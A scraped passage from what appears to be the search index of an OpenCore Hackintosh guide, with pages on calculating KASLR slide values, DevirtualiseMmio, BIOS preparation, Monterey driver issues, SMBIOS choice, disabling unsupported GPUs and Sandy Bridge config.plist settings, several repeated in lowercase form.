newer systems like Ice Lake and Comet Lake\n * ProvideCustomSlide: YES\n   * This makes sure the kernel will only choose good regions and avoid those that may result in boot failures. It's still random but omits those bad regions in its randomization\n * RebuildAppleMemoryMap: YES\n   * Generates Memory Map compatible with macOS, can break on some laptop OEM firmwares so if you receive early boot failures disable this, this makes sure our memory map will fit to what the kernel expects\n\n\n# Prepping the BIOS\n\nThe reason we need to reset the memory map is we want it to be more deterministic, what I mean by this is that there will be less variation on each boot so we have fewer edge cases(Memory Maps are not always consistent on boots). To prep:\n\n * Update BIOS(extremely important as early BIOS's shipped are known to have memory map issues, especially with Z390)\n * Clear CMOS\n * Enable much needed BIOS settings:\n   * Above4GDecoding: This allows devices to use memory regions above 4GB meaning macOS will have more room to fit, can be problematic on some X99, X299 so recommended to test with and without.\n     * Note: On BIOS supporting Resizable BAR Support, enabling Above4G will unlock this option. Please ensure that Booter -> Quirks -> ResizeAppleGpuBars is set to 0 if this is enabled.\n   * Boot Options -> Windows8.1/10 mode: This will make sure no old legacy garbage is loaded. Fun fact, other OS is only designed for booting older versions of Windows and not for other OS.\n * Disable as many unneeded devices in the BIOS(this means there is less variation in the map on each boot, so fewer chances of boot failure). Common settings:\n   * CSM: For legacy support, adds a bunch of garbage we don't want. This also can break the shell so you can't boot into it.\n   * Intel SGX: Software Guard Extensions, takes up a lot of space and does nothing in macOS.\n   * Parallel Port: macOS can't even see parallel.\n   * Serial Port: I'd like to know how many of you are debugging the kernel...\n   * iGPU: Not ideal but some systems have such bloated maps that the iGPU just can't fit.\n   * Thunderbolt: Many hacks don't have thunderbolt working, boards that don't have thunderbolt but have this option just waste more space.\n   * LED lighting: Sorry mate, time to go.\n   * Legacy USB: More Legacy Crap.\n\n\n# Test boot\n\nWith our adjusted EFI, config.plist and BIOS settings, it's time we try out our new setup. If you still have issues, well it looks like we'll need to do a deep dive and calculate our slide value\n\n\n# Finding the Slide value\n\nNow what you'll want to do is open the EFI shell in your boot manager of choice and run memmap. This will give you a list of all pages and their sizes. This is where the fun begins.\n\nExample of what you'll see:\n\nTYPE         START              END                # PAGES            ATTRIBUTES\nRT_Data      0000000000000000   0000000000000FFF   0000000000000001   800000000000000F\nAvailable    0000000000001000   0000000000057FFF   0000000000000057   000000000000000F\nReserved     0000000000058000   0000000000058FFF   0000000000000001   000000000000000F\nAvailable    0000000000059000   000000000008FFFF   0000000000000037   000000000000000F\nRT_Code      0000000000090000   0000000000090FFF   0000000000000001   800000000000000F\nAvailable    0000000000091000   000000000009DFFF   000000000000000D   000000000000000F\nReserved     000000000009E000   000000000009FFFF   0000000000000002   000000000000000F\nAvailable    0000000000100000   000000005B635FFF   000000000005B536   000000000000000F\nBS_Data      000000005B636000   000000005B675FFF   0000000000000040   000000000000000F\nAvailable    000000005B676000   000000006AF77FFF   000000000000F902   000000000000000F\nLoaderCode   000000006AF78000   000000006B155FFF   00000000000001DE   000000000000000F\nBS_Data      000000006B156000   000000006B523FFF   00000000000003CE   000000000000000F\nACPI_NVS     000000006B524000   000000006B524FFF   0000000000000001   000000000000000F\nBS_Data      000000006B526000   000000006B625FFF   0000000000000100   000000000000000F\nAvailable    000000006B626000   000000006B634FFF   000000000000000F   000000000000000F\n\nNow you may be wondering how the hell we convert this to a slide value, well it's quite simple. What we're interested in is the largest available value within the Start column. In this example we see that 000000006B626000 is our largest, do note that these are in HEX so if there are multiple values close to each other you may need to convert them to decimal. To the calculate slide value(macOS's built-in calculator has a programming function by pressing ⌘+3):\n\n000000006B626000 = 0x6B626000\n\n(0x6B626000 - 0x100000)/0x200000 = 0x35A\n\nAnd to verify that this is correct:\n\n0x100000 + (0x35A * 0x200000) = 0x6B500000\n\nWhenever the returned value is not the original(0x6B500000 vs 0x6B626000), just add +1 to your final slide value. This is due to rounding. So for example 0x35A converted to decimal becomes 858 and then +1 will give you slide=859.\n\n> But wait for just a second, this is higher than 256!\n\nThat is correct, this is caused by memory maps that include Above4GDecoding sectors which cannot be used. So you will need to keep going down the list until you find a small enough value(for us that would be 0000000000100000).\n\nAnd just to make it a bit clearer on the formula:\n\n(HEX - 0x100000)/0x200000 = Slide Value in HEX\n\n0x100000 + (Slide Value in HEX * 0x200000) = Your original HEX value(if not then add +1 to your slide value)\n\nWith this formula in mind, the highest Start value you would be able to use to give you a low enough slide value would be 0x20100000.\n\nNow navigate into your config.plist and add your slide value with the rest of your boot arguments(for us it would be slide=0 when using 0x100000). If this value still gives you errors then you may proceed to the second-largest Start value and so on.\n\nSometimes you may find that when you calculate slide that you receive super small values like slide=-0.379150390625, when this happens round this to slide=0.\n\nAnd for users who are having issues finding their slide value can also type $slide [insert largest #Pages value] in the #Sandbox channel on the r/Hackintosh Discord\n\n> But this is soooooo hard\n\nWell fret not, for there is a simple solution. After running memmap in the shell, run:\n\nshell> fs0: //replace with your USB\n\nfs0:\\> dir //to verify this is the right directory, if not try fs1 and so on\n\nDirectory of fs0:\\\n01/01/01 3:30p   EFI\n\nfs0:\\> memmap > memmap.txt\n\n\nThis will add a memmap.txt file to the root of your EFI, you can then proceed to drop it into the r/Hackintosh discord in the #Sandbox channel and type $slide [insert a link to memmap.txt]\n\n\n# Using DevirtualiseMmio\n\nDevirtualiseMmio is quite an interesting quirk, specifically in that it gets around a huge hurdle with many PCI device systems like some Z390 boards and virtually all HEDT boards like X99 and X299. How it does this is it takes MMIO regions and removes runtime attributes allowing them to be used as space for the kernel to sit comfortably, pair this with ProvideCustomSlide quirk means we can keep the security feature of slide while also getting a bootable machine.\n\nFor extremely problematic systems like Threadripper TRX40 19h, we need to find specific regions that aren't required for proper operation. This is where MmioWhitelist comes into play. Note that whitelisting isn't required for most systems\n\nIf you run the debug version of OpenCore with DevirtualiseMmio, you'll notice this in your logs:\n\n21:495 00:009 OCABC: MMIO devirt start\n21:499 00:003 OCABC: MMIO devirt 0x60000000 (0x10000 pages, 0x8000000000000001) skip 0\n21:503 00:003 OCABC: MMIO devirt 0xFE000000 (0x11 pages, 0x8000000000000001) skip 0\n21:506 00:003 OCABC:

OpenCore Debugging on how to enable logging to file\n\nSo we have 6 regions we need to go through and see which are bad, best idea is to block all MMIO sections except one and try each region to get a list of good regions.\n\nNow lets take the above example and create our own MmioWhitelist, we'll need to first convert the address from hexadecimal to decimal:\n\n * MMIO devirt 0x60000000 -> 1610612736\n * MMIO devirt 0xFE000000 -> 4261412864\n * MMIO devirt 0xFEC00000 -> 4273995776\n * MMIO devirt 0xFED00000 -> 4275044352\n * MMIO devirt 0xFEE00000 -> 4276092928\n * MMIO devirt 0xFF000000 -> 4278190080\n\nShould look something like this when done:\n\n",normalizedContent:"# fixing kaslr slide values\n\nthis section is for users who wish to understand and fix \"couldn't

cycling your pc 20 times also can fix the issue but only temporarily.\n\nfun fact: it takes around 31 ms to find an area to operate in, manually setting a slide value can on average can reduce boot times by 0.207%!!!\n\n\n# so how do i fix this\n\nthe real fix to this is quite simple actually. what you'll need:\n\n * opencore users:\n   * openruntime\n   * openshell(don't forget to enable this under root -> misc -> tools)\n\nand we'll also need to configure our config.plist -> booter:\n\n * avoidruntimedefrag: yes\n   * fixes uefi runtime services like date, time, nvram, power control, etc\n * devirtualisemmio: yes\n   * reduces stolen memory footprint, expands options for slide=n values and very helpful with fixing memory allocation issues on z390.\n * enablesafemodeslide: yes\n   * allows for slide values to be used in safe mode\n * protectuefiservices: no\n   * protects uefi services from being overridden by the firmware, mainly relevant for vms, 300 series and newer systems like ice lake and comet lake\n * providecustomslide: yes\n   * this makes sure the kernel will only choose good regions and avoid those that may result in boot failures. it's still random but omits those bad regions in its randomization\n * rebuildapplememorymap: yes\n   * generates memory map compatible with macos, can break on some laptop oem firmwares so if you receive early boot failures disable this, this makes sure our memory map will fit to what the kernel expects\n\n\n# prepping the bios\n\nthe reason we need to reset the memory map is we want it to be more deterministic, what i mean by this is that there will be less variation on each boot so we have fewer edge cases(memory maps are not always consistent on boots). to prep:\n\n * update bios(extremely important as early bios's shipped are known to have memory map issues, especially with z390)\n * clear cmos\n * enable much needed bios settings:\n   * above4gdecoding: this allows devices to use memory regions above 4gb meaning macos will have more room to fit, can be problematic on some x99, x299 so recommended to test with and without.\n     * note: on bios supporting resizable bar support, enabling above4g will unlock this option. please ensure that booter -> quirks -> resizeapplegpubars is set to 0 if this is enabled.\n   * boot options -> windows8.1/10 mode: this will make sure no old legacy garbage is loaded. fun fact, other os is only designed for booting older versions of windows and not for other os.\n * disable as many unneeded devices in the bios(this means there is less variation in the map on each boot, so fewer chances of boot failure). common settings:\n   * csm: for legacy support, adds a bunch of garbage we don't want. this also can break the shell so you can't boot into it.\n   * intel sgx: software guard extensions, takes up a lot of space and does nothing in macos.\n   * parallel port: macos can't even see parallel.\n   * serial port: i'd like to know how many of you are debugging the kernel...\n   * igpu: not ideal but some systems have such bloated maps that the igpu just can't fit.\n   * thunderbolt: many hacks don't have thunderbolt working, boards that don't have thunderbolt but have this option just waste more space.\n   * led lighting: sorry mate, time to go.\n   * legacy usb: more legacy crap.\n\n\n# test boot\n\nwith our adjusted efi, config.plist and bios settings, it's time we try out our new setup. if you still have issues, well it looks like we'll need to do a deep dive and calculate our slide value\n\n\n# finding the slide value\n\nnow what you'll want to do is open the efi shell in your boot manager of choice and run memmap. this will give you a list of all pages and their sizes. this is where the fun begins.\n\nexample of what you'll

simple. what we're interested in is the largest available value within the start column. in this example we see that 000000006b626000 is our largest, do note that these are in hex so if there are multiple values close to each other you may need to convert them to decimal. to the calculate slide value(macos's built-in calculator has a programming function by pressing ⌘+3):\n\n000000006b626000 = 0x6b626000\n\n(0x6b626000 - 0x100000)/0x200000 = 0x35a\n\nand to verify that this is correct:\n\n0x100000 + (0x35a * 0x200000) = 0x6b500000\n\nwhenever the returned value is not the original(0x6b500000 vs 0x6b626000), just add +1 to your final slide value. this is due to rounding. so for example 0x35a converted to decimal becomes 858 and then +1 will give you slide=859.\n\n> but wait for just a second, this is higher than 256!\n\nthat is correct, this is caused by memory maps that include above4gdecoding sectors which cannot be used. so you will need to keep going down the list until you find a small enough value(for us that would be 0000000000100000).\n\nand just to make it a bit clearer on the formula:\n\n(hex - 0x100000)/0x200000 = slide value in hex\n\n0x100000 + (slide value in hex * 0x200000) = your original hex value(if not then add +1 to your slide value)\n\nwith this formula in mind, the highest start value you would be able to use to give you a low enough slide value would be 0x20100000.\n\nnow navigate into your config.plist and add your slide value with the rest of your boot arguments(for us it would be slide=0 when using 0x100000). if this value still gives you errors then you may proceed to the second-largest start value and so on.\n\nsometimes you may find that when you calculate slide that you receive super small values like slide=-0.379150390625, when this happens round this to slide=0.\n\nand for users who are having issues finding their slide value can also type $slide [insert largest #pages value] in the #sandbox channel on the r/hackintosh discord\n\n> but this is soooooo hard\n\nwell fret not, for there is a simple solution. after running memmap in the shell, run:\n\nshell> fs0: //replace with your usb\n\nfs0:\\> dir //to verify this is the right directory, if not try fs1 and so on\n\ndirectory of fs0:\\\n01/01/01 3:30p   efi\n\nfs0:\\> memmap > memmap.txt\n\n\nthis will add a memmap.txt file to the root of your efi, you can then proceed to drop it into the r/hackintosh discord in the #sandbox channel and type $slide [insert a link to memmap.txt]\n\n\n# using devirtualisemmio\n\ndevirtualisemmio is quite an interesting quirk, specifically in that it gets around a huge hurdle with many pci device systems like some z390 boards and virtually all hedt boards like x99 and x299. how it does this is it takes mmio regions and removes runtime attributes allowing them to be used as space for the kernel to sit comfortably, pair this with providecustomslide quirk means we can keep the security feature of slide while also getting a bootable machine.\n\nfor extremely problematic systems like threadripper trx40 19h, we need to find specific regions that aren't required for proper operation. this is where mmiowhitelist comes into play. note that whitelisting isn't required for most systems\n\nif you run the debug version of opencore with devirtualisemmio, you'll notice this in your logs:\n\n21:495 00:009 ocabc: mmio devirt start\n21:499 00:003 ocabc: mmio devirt 0x60000000 (0x10000 pages, 0x8000000000000001) skip 0\n21:503 00:003 ocabc: mmio devirt

0\n21:520 00:003 ocabc: mmio devirt end, saved 278608 kb\n\n\n * note: see opencore debugging on how to enable logging to file\n\nso we have 6 regions we need to go through and see which are bad, best idea is to block all mmio sections except one and try each region to get a list of good regions.\n\nnow lets take the above example and create our own mmiowhitelist, we'll need to first convert the address from hexadecimal to decimal:\n\n * mmio devirt 0x60000000 -> 1610612736\n * mmio devirt 0xfe000000 -> 4261412864\n * mmio devirt 0xfec00000 -> 4273995776\n * mmio devirt 0xfed00000 -> 4275044352\n * mmio devirt 0xfee00000 -> 4276092928\n * mmio devirt 0xff000000 -> 4278190080\n\nshould look something like this when done:\n\n",charsets:{}},{title:"Legacy

Don't forget to update your patches as well with the core count of your CPU. The patches which need to be edited are all named algrey - Force cpuid_cores_per_package, and you only need to change the Replace value. You should change:\n\n * B8000000 0000 => B8 <core count> 0000 0000\n * BA000000 0000 => BA <core count> 0000 0000\n * BA000000 0090 => BA <core count> 0000 0090\n\nWhere <core count> is replaced with the physical core count of your CPU in hexadecimal. For example, an 8-Core 5800X would have the new Replace value be:\n\n * B8 08 0000 0000\n * BA 08 0000 0000\n * BA 08 0000 0090\n\nCore Count => Hexadecimal Table\n\nCORE COUNT   HEXADECIMAL\n4 Core       04\n6 Core       06\n8 Core       08\n12 Core      0C\n16 Core      10\n24 Core      18\n32 Core      20\n64 Core      40\n\n\n# Bluetooth\n\nWARNING\n\nNote that all cards have not been fixed yet, and that bluetooth support is being worked on still.\n\nDo not be surprised if your card does not work, and please be patient!\n\nWith Monterey, Apple has completely rewritten the bluetooth stack. As of writing, many bluetooth devices do not work (legacy Broadcom and Intel). With the rewrite, injector kexts break bluetooth support in Monterey, though firmware uploader kexts are still needed. Make sure that you:\n\n * Disable injector kexts\n   * IntelBluetoothInjector.kext for Intel cards\n   * BrcmBluetoothInjector.kext for Broadcom cards\n   * If you still boot Big Sur or older, you can instead set the MaxKernel field to 20.99.9 for your injector kext in your config.plist.\n * Keep Firmware uploader kexts\n   * IntelBluetoothFirmware.kext for Intel\n   * BrcmPatchRAM2/3.kext + BrcmFirmwareData.kext for Broadcom\n * Add BlueToolFixup\n   * Needed for all non-native Bluetooth devices (Including Intel)\n   * If you still boot Big Sur or older, you can set the MinKernel field to 21.00.0 to prevent BlueToolFixup loading on older OSes.\n\nSee the below issues for more details:\n\n * BlueToolFixup PR\n * Monterey Beta 5+ issues\n\n\n# Ethernet\n\nIntel I211 chipset (typical for some AMD boards i.e. B450) no longer works with SmallTreeIntel82576 kext (network remains in Cable Unplugged status).\n\nAppleIGB confirmed working on I211 @ B450, but NICs on other boards might experience issues (please report if any)\n\nSee the below issues for more details:\n\n * Kext no longer working with MacOS 12.0\n\nThe boot-arg for enabling Intel I225-V ethernet controller has changed since macOS Monterey 12.3. Use e1000=0 instead of dk.e1000=0.\n\n\n# OTA Updates\n\nStarting with Monterey, updates are not delivered to T2 Macs which don't have Secure Boot enabled, and updates do not install properly if your SecureBootModel does not match your machine (ie. non-T2 SMBIOS using j137 or iMacPro1,1 using j160). Hackintoshes which use a T2 SMBIOS MUST have OpenCore 0.7.4+ with SecureBootModel set to Default. If your SMBIOS does not have a T2 chip, then either Default or Disabled is ok.

core count of your cpu. the patches which need to be edited are all named algrey - force cpuid_cores_per_package, and you only need to change the replace value. you should change:\n\n * b8000000 0000 => b8 <core count> 0000 0000\n * ba000000 0000 => ba <core count> 0000 0000\n * ba000000 0090 => ba <core count> 0000 0090\n\nwhere <core count> is replaced with the physical core count of your cpu in hexadecimal. for example, an 8-core 5800x would have the new replace value be:\n\n * b8 08 0000 0000\n * ba 08 0000 0000\n * ba 08 0000 0090\n\ncore count => hexadecimal table\n\ncore count

the bluetooth stack. as of writing, many bluetooth devices do not work (legacy broadcom and intel). with the rewrite, injector kexts break bluetooth support in monterey, though firmware uploader kexts are still needed. make sure that you:\n\n * disable injector kexts\n   * intelbluetoothinjector.kext for intel cards\n   * brcmbluetoothinjector.kext for broadcom cards\n   * if you still boot big sur or older, you can instead set the maxkernel field to 20.99.9 for your injector kext in your config.plist.\n * keep firmware uploader kexts\n   * intelbluetoothfirmware.kext for intel\n   * brcmpatchram2/3.kext + brcmfirmwaredata.kext for broadcom\n * add bluetoolfixup\n   * needed for all non-native bluetooth devices (including intel)\n   * if you still boot big sur or older, you can set the minkernel field to 21.00.0 to prevent bluetoolfixup loading on older oses.\n\nsee the below issues for more details:\n\n * bluetoolfixup pr\n * monterey beta 5+ issues\n\n\n# ethernet\n\nintel

enabled, and updates do not install properly if your securebootmodel does not match your machine (ie. non-t2 smbios using j137 or imacpro1,1 using j160). hackintoshes which use a t2 smbios must have opencore 0.7.4+ with securebootmodel set to default. if your smbios does not have a t2 chip, then either default or disabled is ok. more information is available on the apple secure boot page.\n\nt2

list MacBook MacBook Air MacBook Pro Mac Mini iMac iMac Pro Mac Pro Xserve Miscellaneous SMBIOS",content:'# Choosing the right SMBIOS\n\nWhen choosing the right SMBIOS for your machine, you\'ve gotta understand that it\'s more than just simple CPU match up. Many things can affect how your machine works as your SMBIOS determines CPU Power management, GPU profiles, USB maps and much more.\n\nThe main things to consider when selecting your SMBIOS:\n\n * CPU Type\n   \n   * Specifically mobile vs desktop vs server, as this can greatly affect sleep and overall system stability\n   * This also determines whether or not you can use Apple\'s XCPM and what profiles you get\n     * These 2 are mostly resolved with CPUFriend: Fixing Power management\n   * Note: AMD CPUs do not need to concern about this\n\n * GPU Type\n   \n   * Many things are affected here, like GPU power management (AGPM), display out support (AGDP), sleep (AGDC) and much more.\n     * This is especially relevant when we look to the Mac Mini SMBIOS that only uses mobile hardware, which doesn\'t match well with desktop hardware. This is the reason we highly discourage them unless used for Intel\'s NUC series and such which are based off mobile hardware.\n     * Laptops should also pay very close attention, as Apple always assumes that when a dGPU is present for the SMBIOS, all display outs will be routed through it. This can become an issue when an Optimus laptop has its external displays wired through the iGPU instead, causing black screen issues which would require more patching.\n   * CPUs without an iGPU need to pay very close attention, as features like Quick Look and such will be broken if the SMBIOS expects an iGPU (ie. Every single iMac SMBIOS)\n     * For these situations, look closely at the iMac Pro and Mac Pro SMBIOS\n   * DRM is also tied in here as well however this is mostly resolved here: Fixing DRM\n\n * OS Support\n   \n   * Mainly relevant for older hardware, as macOS may still have support for the CPU however no longer supports SMBIOS from that era\n     * Arrandale CPUs are a great example, as they still have OS support even in Big Sur (however no iGPU support past 10.13.6)\n\n * USB Devices\n   \n   * Certain SMBIOS will have their own USB map which may attach to your hardware causing USB issues.\n     * See here for more info: USB Mapping\n   * Also to note, Skylake+ SMBIOS will also require a USBX device to fix USB current output\n     * See here for more info: Fixing USB Power\n\nXCPM Supported SMBIOS\n\nSMBIOS\nMacBook8,1+\nMacBookAir6,x+\nMacBookPro11,x+\nMacmini7,1+\niMac14,x+\niMacPro1,1\nMacPro7,1+\n\n\n# How to decide\n\nGenerally our recommendations with SMBIOS is as follows:\n\n 1. Find the right CPU Generation and tier as closely as possible\n 2. Then match up with either iGPU only or dGPU SMBIOS\n 3. Finally decide on misc things (like exact GPU and CPU)\n\nAnd there\'s also some special notes with SMBIOS:\n\n * iMacPro1,1 and MacPro7,1 are the only 2 SMBIOS that will allow for dGPU to handle all the workload including background rendering and other tasks that the iGPU would handle\n   * We only recommend this SMBIOS if you require this, however you\'ll likely need to fix power management as sleep may break if your hardware isn\'t of this class (ie. HEDT/Server/AMD): Fixing Power management\n   * Note that this requires a Polaris, Vega or Navi GPU to work properly.\n * iMac20,2 is a custom SMBIOS meant only for Apple\'s custom i9-10910 CPU, so unless you have an i9-10900K we recommend using iMac20,1\n * Mac Mini SMBIOS should be avoided unless you\'re running mobile hardware without a built-in display\n   * Intel NUCs are the ideal hardware for this SMBIOS\n * iGPU-less CPUs MUST pay very close attention when selecting a SMBIOS, as Apple always assumes the iGPU is present on the iMac SMBIOS, so you will need to find a SMBIOS without this requirement like iMac Pro or Mac Pro.\n   * This also applies to AMD CPUs\n\n\n# macOS SMBIOS list\n\nThis is a full list of all of the SMBIOS Apple has ever supported in macOS with extra information

it\'s more than just simple cpu match up. many things can affect how your machine works as your smbios determines cpu power management, gpu profiles, usb maps and much more.\n\nthe main things to consider when selecting your smbios:\n\n * cpu type\n   \n   * specifically mobile vs desktop vs server, as this can greatly affect sleep and overall system stability\n   * this also determines whether or not you can use apple\'s xcpm and what profiles you get\n     * these 2 are mostly resolved with cpufriend: fixing power management\n   * note: amd cpus do not need to concern about this\n\n * gpu type\n   \n   * many things are affected here, like gpu power management (agpm), display out support (agdp), sleep (agdc) and much more.\n     * this is especially relevant when we look to the mac mini smbios that only uses mobile hardware, which doesn\'t match well with desktop hardware. this is the reason we highly discourage them unless used for intel\'s nuc series and such which are based off mobile hardware.\n     * laptops should also pay very close attention, as apple always assumes that when a dgpu is present for the smbios, all display outs will be routed through it. this can become an issue when an optimus laptop has its external displays wired through the igpu instead, causing black screen issues which would require more patching.\n   * cpus without an igpu need to pay very close attention, as features like quick look and such will be broken if the smbios expects an igpu (ie. every single imac smbios)\n     * for these situations, look closely at the imac pro and mac pro smbios\n   * drm is also tied in here as well however this is mostly resolved here: fixing drm\n\n * os support\n   \n   * mainly relevant for older hardware, as macos may still have support for the cpu however no longer supports smbios from that era\n     * arrandale cpus are a great example, as they still have os support even in big sur (however no igpu support past 10.13.6)\n\n * usb devices\n   \n   * certain smbios will have their own usb map which may attach to your hardware causing usb issues.\n     * see here for more info: usb mapping\n   * also to note, skylake+ smbios will also require a usbx device to fix usb current output\n     * see here for more info: fixing usb power\n\nxcpm supported smbios\n\nsmbios\nmacbook8,1+\nmacbookair6,x+\nmacbookpro11,x+\nmacmini7,1+\nimac14,x+\nimacpro1,1\nmacpro7,1+\n\n\n# how to decide\n\ngenerally our recommendations with smbios is as follows:\n\n 1. find the right cpu generation and tier as closely as possible\n 2. then match up with either igpu only or dgpu smbios\n 3. finally decide on misc things (like exact gpu and cpu)\n\nand there\'s also some special notes with smbios:\n\n * imacpro1,1 and macpro7,1 are the only 2 smbios that will allow for dgpu to handle all the workload including background rendering and other tasks that the igpu would handle\n   * we only recommend this smbios if you require this, however you\'ll likely need to fix power management as sleep may break if your hardware isn\'t of this class (ie. hedt/server/amd): fixing power management\n   * note that this requires a polaris, vega or navi gpu to work properly.\n * imac20,2 is a custom smbios meant only for apple\'s custom i9-10910 cpu, so unless you have an i9-10900k we recommend using imac20,1\n * mac mini smbios should be avoided unless you\'re running mobile hardware without a built-in display\n   * intel nucs are the ideal hardware for this smbios\n * igpu-less cpus must pay very close attention when selecting a smbios, as apple always assumes the igpu is present on the imac smbios, so you will need to find a smbios without this requirement like imac pro or mac pro.\n   * this also applies to amd cpus\n\n\n# macos smbios list\n\nthis is a full list of all of the smbios apple has ever supported in macos with extra information like cpu and gpu types.\n\n\n\n * how to decide\n * macos smbios list\n   * macbook\n   * macbook air\n   * macbook pro\n   * mac mini\n   * imac\n   * imac pro\n   * mac pro\n   * xserve\n   *

Well with OpenCore things are slightly different, specifically that we need to specify to which exact device we want to spoof. There are 3 ways we can do this:\n\n * Boot Flag\n   * Disables all GPUs except the iGPU\n * DeviceProperties\n   * Disables GPU on a per-slot basis\n * SSDT\n   * Disables GPU on a per-slot basis\n\nCSM must be off in the BIOS for the spoofing to work correctly, especially on AMD CPU based systems.\n\n\n# Boot Flag\n\nBy far the simplest way, all you need to do is add the following boot-arg:\n\n-wegnoegpu\n\nDo note that this will disable all GPUs excluding the iGPU.\n\n\n# DeviceProperties Method\n\nHere is quite simple, find the PCI route with gfxutil and then create a new DeviceProperties section with your spoof:\n\npath/to/gfxutil -f GFX0\n\n\nAnd the output will result in something similar:\n\nDevicePath = PciRoot(0x0)/Pci(0x1,0x0)/Pci(0x0,0x0)/Pci(0x0,0x0)/Pci(0x0,0x0)\n\n\nWith this, navigate towards Root -> DeviceProperties -> Add and add your PCI route with the following properties:\n\nKEY           TYPE      VALUE\ndisable-gpu   Boolean   True\n\n\n\n\n# SSDT Method\n\nThere are many ways to find the path but generally, the easiest way is to get into Device Manager under windows and find the PCI path.\n\nExample of device path for \\_SB.PCI0.PEG0.PEGP:\n\n\n    DefinitionBlock ("", "SSDT", 2, "DRTNIA", "spoof", 0x00000000)\n    {\n       External (_SB_.PCI0.PEG0.PEGP, DeviceObj)\n\n       Method (_SB.PCI0.PEG0.PEGP._DSM, 4, NotSerialized)\n       {\n          If ((!Arg2 || !(_OSI ("Darwin"))))\n          {\n             Return (Buffer (One)\n             {\n                0x03\n             })\n          }\n\n          Return (Package (0x0A)\n          {\n             "name",\n             Buffer (0x09)\n             {\n                "#display"\n             },\n\n             "IOName",\n             "#display",\n             "class-code",\n             Buffer (0x04)\n             {\n                0xFF, 0xFF, 0xFF, 0xFF\n             },\n          })\n       }\n    }\n\n\n\nA copy of this SSDT can be found here: Spoof-SSDT.dsl.

NVIDIA and the Intel HD/UHD IGPU. Since NVIDIA no longer works on macOS, they may have the monitor plugged into the motherboards HDMI/DP connection for convenience. As a result, Windows will render all games and applications through the IGPU. You can reroute a specific game or application to a different GPU by going to: Settings > System > Display > Graphics settings\n\n\n\nThe rendered game or application will have its buffer copied to the IGPU. Which is then displayed to you. This does come with a few downsides:\n\n * GSync will no longer work.\n * NVIDIA settings can no longer be opened. This requires the display to be connected to the GPU\n * Decreased frame rate.\n * Increased input latency.\n * Refresh rate cap.\n\nIf your motherboard only has an HDMI connector for the iGPU, the maximum refresh rate for spec 2.1 is 120Hz. This assumes your board and monitor are of the same spec. This means your 144Hz monitor is only seeing a maximum of 120Hz as determined by the hardware. This limitation does not apply if your board has a DP connector for the IGPU.\n\nIf you have more than two GPUs (AMD, NVIDIA and Intel), this setting is limited. A monitor connected to the AMD GPU means Windows will only allow you to select the AMD GPU or the Intel IGPU. The NVIDIA GPU will not show. In a future version of Windows, this limitation is removed.\n\nAs a recommendation, if you use both operating systems equally and prefer no downsides, your best option is an HDMI or DP switch.',normalizedContent:'# disabling gpu\n\nso you need to hide your unsupported gpu? well with opencore things are slightly different, specifically that we need to specify to which exact device we

High Sierra\nNote                    Most Sandy bridge boards do not support UEFI\n\n\n# Starting Point\n\nSo making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PM          Needed for proper CPU power management, you will need to run\n                 Pike's ssdtPRGen.sh script to generate this file. This will\n                 be run in post install.\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-XOSI        Makes all _OSI calls specific to Windows work for macOS\n                 (Darwin) Identifier. This may help enabling some features\n                 like XHCI and others.\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\nSSDT-IMEI        Needed to add a missing IMEI device on Sandy Bridge CPU with\n                 7 series motherboards. This is not needed for 6-series\n                 motherboards\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nInfo\n\nThis blocks certain ACPI tables from loading, for us we really care about this. Main reason is that Apple's XCPM does not support Sandy Bridge all too well and can cause AppleIntelCPUPowerManagement panics on boot. To avoid this we make our own PM SSDT in Post-Install and drop the old tables(Note that this is only temporary until we've made our SSDT-PM, we'll re-enable these tables later):\n\nRemoving CpuPm:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete CpuPm\nEnabled          Boolean   YES\nOemTableId       Data      437075506d000000\nTableLength      Number    0\nTableSignature   Data      53534454\n\nRemoving Cpu0Ist:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete Cpu0Ist\nEnabled          Boolean   YES\nOemTableId       Data      4370753049737400\nTableLength      Number    0\nTableSignature   Data      53534454\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be pass-through to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as 